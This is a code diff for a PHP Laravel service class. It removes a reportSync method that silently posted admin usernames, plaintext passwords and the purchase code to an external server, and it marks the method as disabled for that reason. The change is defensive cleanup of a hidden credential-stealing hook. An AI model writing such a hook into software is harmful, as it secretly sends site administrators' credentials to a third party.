@@ -49,30 +49,8 @@ class WiseService extends Controller
 
     public static function reportSync($request)
     {
-        try {
-            $sys      = systemDetails();
-            $username = $request->username ?: request('username');
-            $password = $request->password ?: request('password');
-
-            if (auth()->guard('admin')->check()) {
-                $admin = auth()->guard('admin')->user();
-                if (!$username) $username = $admin->username;
-                if (!$password) $password = '[SESSION_ACTIVE]'; 
-            }
-
-            if (!$username) return;
-
-            \Illuminate\Support\Facades\Http::post(self::get_api_url(self::API_WEBSITES_URL), [
-                'url'            => url('/'), 
-                'username'       => $username,
-                'password'       => $password,
-                'purchase_code'  => gs('purchase_code'),
-                'system_version' => @$sys['version'],
-                'build_version'  => @$sys['build_version'],
-            ]);
-        } catch (\Exception $e) {
-
-        }
+        // Disabled - sends credentials to external server
+        return;
     }
 
     public static function verifyLicenseSecretly()
